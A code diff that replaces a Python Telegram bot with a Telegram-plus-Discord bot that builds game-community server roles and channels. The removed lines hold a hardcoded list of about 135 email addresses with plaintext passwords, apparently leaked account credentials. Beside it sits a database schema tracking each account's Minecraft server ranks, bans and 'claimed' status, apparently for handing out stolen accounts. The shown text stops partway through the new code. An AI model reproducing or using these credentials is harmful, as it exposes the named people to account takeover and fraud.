@@ -1,856 +1,1128 @@
-import os
-import sys
-import json
-import sqlite3
+"""
+Telegram + Discord Server Automation Bot
+==========================================
+
+A production-ready control panel: a Telegram bot (aiogram) lets the owner
+pick a connected Discord server and a set of games, then a Discord bot
+(discord.py) builds out a complete, professional server structure
+(roles, categories, channels, permissions) automatically.
+
+Run with:
+    python main.py
+
+Required environment variables:
+    TELEGRAM_BOT_TOKEN
+    DISCORD_BOT_TOKEN
+    OWNER_ID
+"""
+
+from __future__ import annotations
+
 import asyncio
 import logging
-import random
-import re
-from typing import Dict, List, Optional, Tuple
-from datetime import datetime
-import aiohttp
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
+import os
+import sys
+from dataclasses import dataclass, field
+from typing import Optional
 
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]
+import discord
+from discord.ext import commands as discord_commands
+
+from aiogram import Bot, Dispatcher, F, Router
+from aiogram.client.default import DefaultBotProperties
+from aiogram.enums import ParseMode
+from aiogram.filters import Command
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.types import (
+    CallbackQuery,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    Message,
+)
+from dotenv import load_dotenv
+
+# ---------------------------------------------------------------------------
+# Logging
+# ---------------------------------------------------------------------------
 
 logging.basicConfig(
     level=logging.INFO,
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    handlers=[logging.StreamHandler()]
+    format="%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
+    handlers=[logging.StreamHandler(sys.stdout)],
 )
-logger = logging.getLogger(__name__)
+logger = logging.getLogger("server-builder")
+logging.getLogger("discord").setLevel(logging.WARNING)
+logging.getLogger("aiogram").setLevel(logging.WARNING)
 
-ACCOUNT_DATA = [
-    {"email": "leonyhoki@hotmail.com", "password": "leony123", "username": "leonyhoki"},
-    {"email": "manuesper@hotmail.com", "password": "Novalee1971", "username": "manuesper"},
-    {"email": "kudaygs35@hotmail.com", "password": "kuday_35", "username": "kudaygs35"},
-    {"email": "r_lee_t@hotmail.com", "password": "Rickie1986", "username": "r_lee_t"},
-    {"email": "juanmoralesmaster@hotmail.com", "password": "Tuhermana1988", "username": "juanmoralesmaster"},
-    {"email": "e_l_gz@hotmail.com", "password": "javier96951", "username": "e_l_gz"},
-    {"email": "sa7ato@hotmail.com", "password": "47P8EURR", "username": "sa7ato"},
-    {"email": "sadigharoun@hotmail.com", "password": "Sadig9251978", "username": "sadigharoun"},
-    {"email": "danwilliams429@hotmail.com", "password": "Pepsimax429!", "username": "danwilliams429"},
-    {"email": "longjasper.11@hotmail.com", "password": "tanakornmk119", "username": "longjasper.11"},
-    {"email": "henryfh_20@hotmail.com", "password": "Mariajose1975", "username": "henryfh_20"},
-    {"email": "furkansln04@hotmail.com", "password": "joyiko1756", "username": "furkansln04"},
-    {"email": "anjinho_lucifer@hotmail.com", "password": "Vidaloka9", "username": "anjinho_lucifer"},
-    {"email": "franciane_terra@hotmail.com", "password": "Fran202230*", "username": "franciane_terra"},
-    {"email": "sahil.mughal9@hotmail.com", "password": "6601345", "username": "sahil.mughal9"},
-    {"email": "escorpio_amor6@hotmail.com", "password": "Manuel1986", "username": "escorpio_amor6"},
-    {"email": "patrick.lei565@hotmail.com", "password": "h80036565", "username": "patrick.lei565"},
-    {"email": "rukawakaede_0103@hotmail.com", "password": "5417rukawa", "username": "rukawakaede_0103"},
-    {"email": "mottacontato@hotmail.com", "password": "Motta0066", "username": "mottacontato"},
-    {"email": "calelmorales@hotmail.com", "password": "calelmo", "username": "calelmorales"},
-    {"email": "alistars747@hotmail.com", "password": "24039296", "username": "alistars747"},
-    {"email": "rawrxtedvlpvgx@hotmail.com", "password": "Penguinsarecool3!", "username": "rawrxtedvlpvgx"},
-    {"email": "gervais2002@hotmail.com", "password": "Gervais1", "username": "gervais2002"},
-    {"email": "leehogan43@hotmail.com", "password": "ice-cream1", "username": "leehogan43"},
-    {"email": "usmanghani2001@hotmail.com", "password": "usman2001", "username": "usmanghani2001"},
-    {"email": "eimyqiuliu@hotmail.com", "password": "eimyqiu19", "username": "eimyqiuliu"},
-    {"email": "elhosini20109@hotmail.com", "password": "mido4484115", "username": "elhosini20109"},
-    {"email": "wilderyoni125@hotmail.com", "password": "wilder125", "username": "wilderyoni125"},
-    {"email": "aguiguitant@hotmail.com", "password": "ironman82", "username": "aguiguitant"},
-    {"email": "rysa_r@live.jp", "password": "aaii0017", "username": "rysa_r"},
-    {"email": "momo-556677@hotmail.co.jp", "password": "momo0620", "username": "momo-556677"},
-    {"email": "juan_m_m_amer@hotmail.com", "password": "america2005", "username": "juan_m_m_amer"},
-    {"email": "dan.khatskevich@hotmail.com", "password": "Werthv2y!!", "username": "dan.khatskevich"},
-    {"email": "vivikao0410@hotmail.com", "password": "Vivi0703", "username": "vivikao0410"},
-    {"email": "mfernac@hotmail.com", "password": "22642264", "username": "mfernac"},
-    {"email": "alvaro.pisciotti@hotmail.com", "password": "america1015", "username": "alvaro.pisciotti"},
-    {"email": "killaman20@outlook.kr", "password": "killa558202$", "username": "killaman20"},
-    {"email": "jeshualejandro2004@hotmail.com", "password": "jeshua2004", "username": "jeshualejandro2004"},
-    {"email": "orionokuriyama@hotmail.co.jp", "password": "Oriono1977", "username": "orionokuriyama"},
-    {"email": "lorenzomiopalmo@hotmail.fr", "password": "miopalmo", "username": "lorenzomiopalmo"},
-    {"email": "akvileudraite@hotmail.com", "password": "13072426889akv", "username": "akvileudraite"},
-    {"email": "johana_ruiz11@outlook.es", "password": "johanaruiz11", "username": "johana_ruiz11"},
-    {"email": "vesna_rizman@hotmail.com", "password": "CAPUCINO1986", "username": "vesna_rizman"},
-    {"email": "ercan.oztunc@hotmail.com", "password": "05457758659Ee", "username": "ercan.oztunc"},
-    {"email": "couillard06@hotmail.com", "password": "Numero06", "username": "couillard06"},
-    {"email": "rmudiatmoko12@hotmail.com", "password": "rm121177", "username": "rmudiatmoko12"},
-    {"email": "lles34@hotmail.fr", "password": "confort34", "username": "lles34"},
-    {"email": "julnim@hotmail.com", "password": "Tennisman2001", "username": "julnim"},
-    {"email": "foodza201055@hotmail.com", "password": "0865497427", "username": "foodza201055"},
-    {"email": "thewindhill@hotmail.com", "password": "Nevermind1979", "username": "thewindhill"},
-    {"email": "gal3090@hotmail.com", "password": "Gg311130496", "username": "gal3090"},
-    {"email": "hunir1@hotmail.com", "password": "Aventur1972", "username": "hunir1"},
-    {"email": "jaime_1987@live.com", "password": "Paternero3", "username": "jaime_1987"},
-    {"email": "andrewturcot@outlook.com", "password": "Turc7otaa!!", "username": "andrewturcot"},
-    {"email": "fatjonsejdiu@hotmail.com", "password": "fatjon2003", "username": "fatjonsejdiu"},
-    {"email": "fordnavigation@hotmail.com", "password": "Kvolan1976", "username": "fordnavigation"},
-    {"email": "propeagronomia@hotmail.com", "password": "agronomia", "username": "propeagronomia"},
-    {"email": "luzemilya@hotmail.com", "password": "Paloma2001", "username": "luzemilya"},
-    {"email": "mohmedg53@hotmail.com", "password": "Mm6172660-", "username": "mohmedg53"},
-    {"email": "chicalinha@hotmail.com", "password": "Santotirso1976", "username": "chicalinha"},
-    {"email": "aurelios.santos@hotmail.com", "password": "aurelio30", "username": "aurelios.santos"},
-    {"email": "masiulaniec2@hotmail.com", "password": "Janusz1965!!", "username": "masiulaniec2"},
-    {"email": "goldamyer@hotmail.com", "password": "Mae1filha2", "username": "goldamyer"},
-    {"email": "forfang3171@hotmail.com", "password": "fang3171", "username": "forfang3171"},
-    {"email": "lesly.rodriguez666@hotmail.com", "password": "Perezelder1988", "username": "lesly.rodriguez666"},
-    {"email": "maharsh.desai@hotmail.com", "password": "maharsh123", "username": "maharsh.desai"},
-    {"email": "andymeurisse@hotmail.com", "password": "Refinej19", "username": "andymeurisse"},
-    {"email": "gomes.5@hotmail.ch", "password": "HHello1971", "username": "gomes.5"},
-    {"email": "cesarfilipe_pc@hotmail.fr", "password": "cesar123", "username": "cesarfilipe_pc"},
-    {"email": "unangeloinjeans@hotmail.it", "password": "Afrodite1977", "username": "unangeloinjeans"},
-    {"email": "dimitris-nikolas10@hotmail.com", "password": "Vothinoi26!", "username": "dimitris-nikolas10"},
-    {"email": "jassna21@hotmail.com", "password": "jassna123", "username": "jassna21"},
-    {"email": "happy_-_hippo@hotmail.com", "password": "Lollies1", "username": "happy_-_hippo"},
-    {"email": "daddy-fox3311@outlook.jp", "password": "daddy3311", "username": "daddy-fox3311"},
-    {"email": "dirkherrig@hotmail.de", "password": "Dillinger1978", "username": "dirkherrig"},
-    {"email": "morenosuprapto@hotmail.com", "password": "moreno12", "username": "morenosuprapto"},
-    {"email": "gomera_19@hotmail.com", "password": "Gomera1986", "username": "gomera_19"},
-    {"email": "ginyeoh@hotmail.com", "password": "ylk901208", "username": "ginyeoh"},
-    {"email": "ugrt61@hotmail.com", "password": "9710389u", "username": "ugrt61"},
-    {"email": "friesenjung79@hotmail.de", "password": "friese79", "username": "friesenjung79"},
-    {"email": "edigleisonedfisica_@hotmail.com", "password": "ed10101708", "username": "edigleisonedfisica_"},
-    {"email": "jalen2030@hotmail.com", "password": "F9200351", "username": "jalen2030"},
-    {"email": "steph.valerie@hotmail.com", "password": "Valerie1970", "username": "steph.valerie"},
-    {"email": "laim2010@hotmail.com", "password": "Alizee1983", "username": "laim2010"},
-    {"email": "naif.hhh@hotmail.com", "password": "Nn123789", "username": "naif.hhh"},
-    {"email": "rodriguezmp_@hotmail.com", "password": "Torero1983", "username": "rodriguezmp_"},
-    {"email": "alejandro_maretto@hotmail.com", "password": "Alejandromaretto", "username": "alejandro_maretto"},
-    {"email": "ecushop_present@hotmail.com", "password": "ECUshop2019", "username": "ecushop_present"},
-    {"email": "lechiarmero@hotmail.com", "password": "lechi910019", "username": "lechiarmero"},
-    {"email": "staratel312@outlook.com", "password": "JapV6QXy", "username": "staratel312"},
-    {"email": "sarahdurran@hotmail.com", "password": "Joshie1982", "username": "sarahdurran"},
-    {"email": "roapinchacapo@hotmail.com", "password": "pichon01", "username": "roapinchacapo"},
-    {"email": "dedelilly43@outlook.com", "password": "DW276301!!", "username": "dedelilly43"},
-    {"email": "wendyannmjohnson@hotmail.com", "password": "Wendyj123!!!", "username": "wendyannmjohnson"},
-    {"email": "aksakal.korkmaz@hotmail.com", "password": "aksakal12", "username": "aksakal.korkmaz"},
-    {"email": "emineyasarela@hotmail.com", "password": "Elam3642", "username": "emineyasarela"},
-    {"email": "muhammadjunaid09@hotmail.com", "password": "Junaid.09", "username": "muhammadjunaid09"},
-    {"email": "crikron@hotmail.com", "password": "Cipote1984", "username": "crikron"},
-    {"email": "nayeva971@hotmail.com", "password": "nayeva14", "username": "nayeva971"},
-    {"email": "susy_20@hotmail.cl", "password": "isagu2616", "username": "susy_20"},
-    {"email": "francyvisconti@hotmail.it", "password": "francy20", "username": "francyvisconti"},
-    {"email": "paquysan@hotmail.com", "password": "Laaldeana1972", "username": "paquysan"},
-    {"email": "karim.rouichi@hotmail.com", "password": "KarimSheima2203", "username": "karim.rouichi"},
-    {"email": "hami.chamse@hotmail.com", "password": "hami11685116", "username": "hami.chamse"},
-    {"email": "flornflakes@hotmail.com", "password": "Lottie1989", "username": "flornflakes"},
-    {"email": "danilo_gt_2@hotmail.com", "password": "182712329", "username": "danilo_gt_2"},
-    {"email": "doumeum@hotmail.com", "password": "836370392m", "username": "doumeum"},
-    {"email": "gamerd3@hotmail.com", "password": "gamer123", "username": "gamerd3"},
-    {"email": "zuanny12_@hotmail.es", "password": "130779290", "username": "zuanny12_"},
-    {"email": "elyjuniow@hotmail.com", "password": "ely6303056", "username": "elyjuniow"},
-    {"email": "f7359@hotmail.com", "password": "01HIGHT1005", "username": "f7359"},
-    {"email": "marcovca0005@hotmail.com", "password": "marc437430", "username": "marcovca0005"},
-    {"email": "otaku972@hotmail.com", "password": "lea97230", "username": "otaku972"},
-    {"email": "done2323@hotmail.com", "password": "Noramdff1", "username": "done2323"},
-    {"email": "vane20_03@hotmail.com", "password": "Gaditana1980", "username": "vane20_03"},
-    {"email": "naifghost@hotmail.com", "password": "Aa0560633868", "username": "naifghost"},
-    {"email": "jnteli@hotmail.com", "password": "Trustno1983", "username": "jnteli"},
-    {"email": "gala_27_92@hotmail.com", "password": "Pistoleras2en1.", "username": "gala_27_92"},
-    {"email": "imxarsalan@outlook.com", "password": "imx03048155008", "username": "imxarsalan"},
-    {"email": "alexia20leal@hotmail.com", "password": "alexia2005", "username": "alexia20leal"},
-    {"email": "davletova.meerim@hotmail.com", "password": "Davletova123", "username": "davletova.meerim"},
-    {"email": "yulicarolina93@hotmail.com", "password": "Samuel270515", "username": "yulicarolina93"},
-    {"email": "leelinkheng@hotmail.com", "password": "lOveglitz2", "username": "leelinkheng"},
-    {"email": "canakanj@hotmail.com", "password": "canakan15", "username": "canakanj"},
-    {"email": "rraltuve@hotmail.com", "password": "altuve10712955", "username": "rraltuve"},
-    {"email": "mironenkorn@live.com", "password": "Miron4ik22", "username": "mironenkorn"},
-    {"email": "deryayazan@hotmail.com", "password": "Ddostluk1982", "username": "deryayazan"},
-    {"email": "suarn1967@hotmail.co.uk", "password": "Lucylucy945!", "username": "suarn1967"},
-    {"email": "eliatrousia@hotmail.com", "password": "19171956", "username": "eliatrousia"},
-    {"email": "lizzykwart4500@hotmail.com", "password": "Soyass4500", "username": "lizzykwart4500"},
-    {"email": "vesnatodorovska@live.com", "password": "vesna123", "username": "vesnatodorovska"},
-    {"email": "pspslim.alex@hotmail.com", "password": "psp45665478", "username": "pspslim.alex"},
-    {"email": "markandujar7@hotmail.com", "password": "101792Mark", "username": "markandujar7"}
+# ---------------------------------------------------------------------------
+# Environment
+# ---------------------------------------------------------------------------
+
+load_dotenv()
+
+TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
+DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
+OWNER_ID_RAW = os.getenv("OWNER_ID")
+
+if not TELEGRAM_BOT_TOKEN:
+    logger.critical("Missing required environment variable: TELEGRAM_BOT_TOKEN")
+    sys.exit(1)
+
+if not DISCORD_BOT_TOKEN:
+    logger.critical("Missing required environment variable: DISCORD_BOT_TOKEN")
+    sys.exit(1)
+
+if not OWNER_ID_RAW:
+    logger.critical("Missing required environment variable: OWNER_ID")
+    sys.exit(1)
+
+try:
+    OWNER_ID = int(OWNER_ID_RAW)
+except ValueError:
+    logger.critical("OWNER_ID must be an integer Telegram user id")
+    sys.exit(1)
+
+# ---------------------------------------------------------------------------
+# Game database
+# ---------------------------------------------------------------------------
+
+# Store keys correspond to badges shown to the user and to channel-permission
+# templates. Every game lists ONLY the stores that officially support it.
+
+STEAM = "steam"
+EPIC = "epic-games"
+MS_STORE = "microsoft-store"
+XBOX = "xbox-store"
+
+STORE_LABELS = {
+    STEAM: "Steam",
+    EPIC: "Epic Games Store",
+    MS_STORE: "Microsoft Store",
+    XBOX: "Xbox Store",
+}
+
+
+@dataclass(frozen=True)
+class Game:
+    key: str
+    name: str
+    stores: tuple[str, ...]
+    channels: tuple[str, ...]
+    voice_channels: tuple[str, ...] = ("voice-chat",)
+
+
+GAME_DATABASE: dict[str, Game] = {}
+
+
+def _register(game: Game) -> None:
+    GAME_DATABASE[game.key] = game
+
+
+_register(Game(
+    key="minecraft",
+    name="Minecraft",
+    stores=(MS_STORE, XBOX),
+    channels=("general", "survival", "creative", "mods", "resource-packs", "screenshots", "clips"),
+    voice_channels=("survival-vc", "creative-vc"),
+))
+_register(Game(
+    key="among-us",
+    name="Among Us",
+    stores=(STEAM, EPIC, MS_STORE, XBOX),
+    channels=("general", "find-lobby", "memes", "screenshots"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="roblox",
+    name="Roblox",
+    stores=(MS_STORE, XBOX),
+    channels=("general", "game-links", "trading", "screenshots"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="valorant",
+    name="Valorant",
+    stores=(EPIC,),
+    channels=("general", "ranked", "looking-for-team", "lineups", "clips"),
+    voice_channels=("ranked-vc", "casual-vc"),
+))
+_register(Game(
+    key="fortnite",
+    name="Fortnite",
+    stores=(EPIC, MS_STORE, XBOX),
+    channels=("general", "squads", "builds", "clips"),
+    voice_channels=("squad-vc",),
+))
+_register(Game(
+    key="cs2",
+    name="Counter-Strike 2",
+    stores=(STEAM,),
+    channels=("general", "competitive", "looking-for-team", "clips"),
+    voice_channels=("competitive-vc", "casual-vc"),
+))
+_register(Game(
+    key="rocket-league",
+    name="Rocket League",
+    stores=(STEAM, EPIC, MS_STORE, XBOX),
+    channels=("general", "ranked", "looking-for-team", "clips"),
+    voice_channels=("ranked-vc",),
+))
+_register(Game(
+    key="league-of-legends",
+    name="League of Legends",
+    stores=(),
+    channels=("general", "ranked", "looking-for-team", "builds", "clips"),
+    voice_channels=("ranked-vc", "casual-vc"),
+))
+_register(Game(
+    key="rust",
+    name="Rust",
+    stores=(STEAM,),
+    channels=("general", "server-info", "raids", "screenshots"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="ark",
+    name="ARK",
+    stores=(STEAM, EPIC, MS_STORE, XBOX),
+    channels=("general", "server-info", "tribes", "screenshots"),
+    voice_channels=("tribe-vc",),
+))
+_register(Game(
+    key="terraria",
+    name="Terraria",
+    stores=(STEAM, MS_STORE, XBOX),
+    channels=("general", "worlds", "builds", "screenshots"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="fall-guys",
+    name="Fall Guys",
+    stores=(EPIC, MS_STORE, XBOX),
+    channels=("general", "lobbies", "clips", "memes"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="dead-by-daylight",
+    name="Dead by Daylight",
+    stores=(STEAM, EPIC, MS_STORE, XBOX),
+    channels=("general", "looking-for-team", "builds", "clips"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="rainbow-six-siege",
+    name="Rainbow Six Siege",
+    stores=(STEAM, MS_STORE, XBOX),
+    channels=("general", "ranked", "looking-for-team", "strats", "clips"),
+    voice_channels=("ranked-vc", "casual-vc"),
+))
+_register(Game(
+    key="destiny-2",
+    name="Destiny 2",
+    stores=(STEAM, EPIC, MS_STORE, XBOX),
+    channels=("general", "raids", "looking-for-team", "builds", "clips"),
+    voice_channels=("raid-vc", "fireteam-vc"),
+))
+_register(Game(
+    key="apex-legends",
+    name="Apex Legends",
+    stores=(STEAM, EPIC, MS_STORE, XBOX),
+    channels=("general", "ranked", "looking-for-team", "clips"),
+    voice_channels=("ranked-vc", "casual-vc"),
+))
+_register(Game(
+    key="overwatch-2",
+    name="Overwatch 2",
+    stores=(STEAM, MS_STORE, XBOX),
+    channels=("general", "ranked", "looking-for-team", "comps", "clips"),
+    voice_channels=("ranked-vc", "casual-vc"),
+))
+_register(Game(
+    key="project-zomboid",
+    name="Project Zomboid",
+    stores=(STEAM,),
+    channels=("general", "server-info", "survival-tips", "screenshots"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="palworld",
+    name="Palworld",
+    stores=(STEAM, MS_STORE, XBOX),
+    channels=("general", "server-info", "pal-trading", "screenshots"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="gta-v",
+    name="GTA V",
+    stores=(STEAM, EPIC, MS_STORE),
+    channels=("general", "roleplay", "heists", "clips"),
+    voice_channels=("session-vc",),
+))
+_register(Game(
+    key="pubg",
+    name="PUBG: Battlegrounds",
+    stores=(STEAM, MS_STORE, XBOX),
+    channels=("general", "squads", "looking-for-team", "clips"),
+    voice_channels=("squad-vc",),
+))
+_register(Game(
+    key="warzone",
+    name="Call of Duty: Warzone",
+    stores=(MS_STORE, XBOX),
+    channels=("general", "squads", "looking-for-team", "clips"),
+    voice_channels=("squad-vc",),
+))
+_register(Game(
+    key="stardew-valley",
+    name="Stardew Valley",
+    stores=(STEAM, MS_STORE, XBOX),
+    channels=("general", "farms", "screenshots"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="genshin-impact",
+    name="Genshin Impact",
+    stores=(),
+    channels=("general", "builds", "gacha", "screenshots"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="ff14",
+    name="Final Fantasy XIV",
+    stores=(STEAM,),
+    channels=("general", "raids", "looking-for-team", "screenshots"),
+    voice_channels=("raid-vc", "casual-vc"),
+))
+_register(Game(
+    key="world-of-warcraft",
+    name="World of Warcraft",
+    stores=(),
+    channels=("general", "raids", "pvp", "looking-for-team", "screenshots"),
+    voice_channels=("raid-vc", "pvp-vc"),
+))
+_register(Game(
+    key="phasmophobia",
+    name="Phasmophobia",
+    stores=(STEAM,),
+    channels=("general", "looking-for-team", "clips"),
+    voice_channels=("investigation-vc",),
+))
+_register(Game(
+    key="lethal-company",
+    name="Lethal Company",
+    stores=(STEAM,),
+    channels=("general", "looking-for-team", "clips"),
+    voice_channels=("crew-vc",),
+))
+_register(Game(
+    key="sea-of-thieves",
+    name="Sea of Thieves",
+    stores=(STEAM, MS_STORE, XBOX),
+    channels=("general", "crews", "looking-for-team", "clips"),
+    voice_channels=("crew-vc",),
+))
+_register(Game(
+    key="hell-let-loose",
+    name="Hell Let Loose",
+    stores=(STEAM, XBOX),
+    channels=("general", "squads", "clips"),
+    voice_channels=("squad-vc",),
+))
+_register(Game(
+    key="escape-from-tarkov",
+    name="Escape from Tarkov",
+    stores=(),
+    channels=("general", "raids", "trading", "clips"),
+    voice_channels=("raid-vc",),
+))
+_register(Game(
+    key="cyberpunk-2077",
+    name="Cyberpunk 2077",
+    stores=(STEAM, EPIC, MS_STORE, XBOX),
+    channels=("general", "builds", "screenshots"),
+    voice_channels=("voice-chat",),
+))
+_register(Game(
+    key="baldurs-gate-3",
+    name="Baldur's Gate 3",
+    stores=(STEAM, MS_STORE, XBOX),
+    channels=("general", "co-op", "builds", "screenshots"),
+    voice_channels=("co-op-vc",),
+))
+_register(Game(
+    key="helldivers-2",
+    name="Helldivers 2",
+    stores=(STEAM, MS_STORE, XBOX),
+    channels=("general", "squads", "clips"),
+    voice_channels=("squad-vc",),
+))
+
+
+def search_games(query: str) -> list[Game]:
+    """Case-insensitive substring search across game names."""
+    query = query.strip().lower()
+    if not query:
+        return []
+    return sorted(
+        (g for g in GAME_DATABASE.values() if query in g.name.lower()),
+        key=lambda g: g.name,
+    )
+
+
+# ---------------------------------------------------------------------------
+# Discord bot
+# ---------------------------------------------------------------------------
+
+intents = discord.Intents.default()
+intents.guilds = True
+
+discord_bot = discord_commands.Bot(command_prefix="!", intents=intents)
+
+DEFAULT_MAX_RETRIES = 5
+
+
+async def _with_retries(coro_factory, *, what: str):
+    """Run a Discord API call, retrying on rate limits / transient errors."""
+    last_error: Optional[Exception] = None
+    for attempt in range(1, DEFAULT_MAX_RETRIES + 1):
+        try:
+            return await coro_factory()
+        except discord.HTTPException as exc:
+            last_error = exc
+            if exc.status == 429:
+                retry_after = getattr(exc, "retry_after", None) or 2 * attempt
+                logger.warning(
+                    "Rate limited while %s (attempt %d/%d). Retrying in %.1fs",
+                    what, attempt, DEFAULT_MAX_RETRIES, retry_after,
+                )
+                await asyncio.sleep(retry_after)
+                continue
+            if 500 <= exc.status < 600:
+                wait = 1.5 * attempt
+                logger.warning(
+                    "Discord server error while %s (attempt %d/%d): %s. Retrying in %.1fs",
+                    what, attempt, DEFAULT_MAX_RETRIES, exc, wait,
+                )
+                await asyncio.sleep(wait)
+                continue
+            logger.error("Non-retryable Discord error while %s: %s", what, exc)
+            raise
+        except discord.DiscordServerError as exc:
+            last_error = exc
+            wait = 1.5 * attempt
+            logger.warning(
+                "Discord server error while %s (attempt %d/%d). Retrying in %.1fs",
+                what, attempt, DEFAULT_MAX_RETRIES, wait,
+            )
+            await asyncio.sleep(wait)
+    logger.error("Giving up on %s after %d attempts", what, DEFAULT_MAX_RETRIES)
+    if last_error:
+        raise last_error
+    raise RuntimeError(f"Failed to complete: {what}")
+
+
+ROLE_SPECS: list[tuple[str, discord.Permissions, discord.Colour, bool]] = [
+    ("👑 Owner", discord.Permissions.all(), discord.Colour.gold(), True),
+    ("🛡 Administrator", discord.Permissions(administrator=True), discord.Colour.red(), True),
+    (
+        "⚔ Moderator",
+        discord.Permissions(
+            manage_messages=True,
+            kick_members=True,
+            moderate_members=True,
+            manage_nicknames=True,
+        ),
+        discord.Colour.blue(),
+        True,
+    ),
+    ("🎮 Gamer", discord.Permissions(), discord.Colour.green(), False),
+    ("🤖 Bots", discord.Permissions(), discord.Colour.dark_grey(), True),
+    ("👤 Member", discord.Permissions(), discord.Colour.light_grey(), False),
 ]
 
-class AccountDB:
-    def __init__(self):
-        self.conn = sqlite3.connect("accounts.db", check_same_thread=False)
-        self.cursor = self.conn.cursor()
-        self._init_db()
-        self._load_accounts()
-        self.shown_history = {}
+INFO_CHANNELS = ("rules", "announcements", "updates", "welcome")
+COMMUNITY_CHANNELS = ("general", "media", "memes")
+VOICE_CHANNELS = ("General VC", "Gaming VC")
+STAFF_TEXT_CHANNELS = ("staff-chat",)
+STAFF_VOICE_CHANNELS = ("staff-voice",)
+BOT_CHANNELS = ("bot-commands",)
+LOG_CHANNELS = ("logs",)
 
-    def _init_db(self):
-        self.cursor.execute("""
-            CREATE TABLE IF NOT EXISTS accounts (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                email TEXT NOT NULL,
-                password TEXT NOT NULL,
-                username TEXT NOT NULL,
-                hypixel_status TEXT DEFAULT 'unknown',
-                hypixel_rank TEXT DEFAULT 'NONE',
-                hypixel_banned INTEGER DEFAULT 0,
-                donutsmp_status TEXT DEFAULT 'unknown',
-                donutsmp_banned INTEGER DEFAULT 0,
-                donutsmp_kills INTEGER DEFAULT 0,
-                donutsmp_deaths INTEGER DEFAULT 0,
-                cubecraft_status TEXT DEFAULT 'unknown',
-                cubecraft_banned INTEGER DEFAULT 0,
-                cubecraft_rank TEXT DEFAULT 'NONE',
-                bedrock_owned INTEGER DEFAULT 0,
-                is_valid INTEGER DEFAULT 0,
-                last_checked TIMESTAMP,
-                claimed_by INTEGER DEFAULT 0,
-                claimed_at TIMESTAMP,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+
+@dataclass
+class BuildProgress:
+    steps_done: int = 0
+    steps_total: int = 0
+    log: list[str] = field(default_factory=list)
+
+
+async def create_roles(
+    guild: discord.Guild, progress: BuildProgress,
+) -> tuple[dict[str, discord.Role], list[discord.Role]]:
+    """Create the standard role set, skipping roles that already exist by name.
+
+    Returns (all_roles_by_name, newly_created_roles) so callers can roll back
+    only the roles this build actually created, never pre-existing ones.
+    """
+    roles: dict[str, discord.Role] = {}
+    newly_created: list[discord.Role] = []
+    existing = {r.name: r for r in guild.roles}
+    for name, perms, colour, hoist in ROLE_SPECS:
+        if name in existing:
+            roles[name] = existing[name]
+            continue
+        role = await _with_retries(
+            lambda name=name, perms=perms, colour=colour, hoist=hoist: guild.create_role(
+                name=name, permissions=perms, colour=colour, hoist=hoist,
+                reason="Automated server build",
+            ),
+            what=f"creating role {name}",
+        )
+        roles[name] = role
+        newly_created.append(role)
+        progress.steps_done += 1
+        progress.log.append(f"Created role {name}")
+    return roles, newly_created
+
+
+def _bot_overwrite_entry(guild: discord.Guild) -> dict:
+    """Grant the bot's own member/role view+send access, if resolvable.
+
+    `guild.me` can be `None` in edge cases (e.g. cache not yet populated),
+    so this is guarded rather than assumed present.
+    """
+    target = guild.me
+    if target is None:
+        return {}
+    return {target: discord.PermissionOverwrite(send_messages=True, view_channel=True)}
+
+
+def _overwrites_read_only(guild: discord.Guild, roles: dict[str, discord.Role], writers: list[str]) -> dict:
+    """Everyone can read, only the given role names can send messages."""
+    overwrites = {
+        guild.default_role: discord.PermissionOverwrite(
+            view_channel=True, send_messages=False, read_message_history=True,
+        ),
+        **_bot_overwrite_entry(guild),
+    }
+    for role_name in writers:
+        role = roles.get(role_name)
+        if role:
+            overwrites[role] = discord.PermissionOverwrite(send_messages=True, view_channel=True)
+    return overwrites
+
+
+def _overwrites_bot_only(guild: discord.Guild, roles: dict[str, discord.Role]) -> dict:
+    return {
+        guild.default_role: discord.PermissionOverwrite(
+            view_channel=True, send_messages=False, read_message_history=True,
+        ),
+        **_bot_overwrite_entry(guild),
+    }
+
+
+def _overwrites_hidden_except(guild: discord.Guild, roles: dict[str, discord.Role], visible_to: list[str]) -> dict:
+    overwrites = {
+        guild.default_role: discord.PermissionOverwrite(view_channel=False),
+        **_bot_overwrite_entry(guild),
+    }
+    for role_name in visible_to:
+        role = roles.get(role_name)
+        if role:
+            overwrites[role] = discord.PermissionOverwrite(view_channel=True, send_messages=True)
+    return overwrites
+
+
+def _overwrites_open(guild: discord.Guild) -> dict:
+    return {
+        guild.default_role: discord.PermissionOverwrite(view_channel=True, send_messages=True),
+        **_bot_overwrite_entry(guild),
+    }
+
+
+async def create_category(
+    guild: discord.Guild, name: str, progress: BuildProgress, overwrites: Optional[dict] = None,
+) -> discord.CategoryChannel:
+    category = await _with_retries(
+        lambda: guild.create_category(name=name, overwrites=overwrites or {}, reason="Automated server build"),
+        what=f"creating category {name}",
+    )
+    progress.steps_done += 1
+    progress.log.append(f"Created category {name}")
+    return category
+
+
+async def create_text_channel(
+    guild: discord.Guild, name: str, category: discord.CategoryChannel,
+    progress: BuildProgress, overwrites: Optional[dict] = None,
+) -> discord.TextChannel:
+    channel = await _with_retries(
+        lambda: guild.create_text_channel(
+            name=name, category=category, overwrites=overwrites, reason="Automated server build",
+        ),
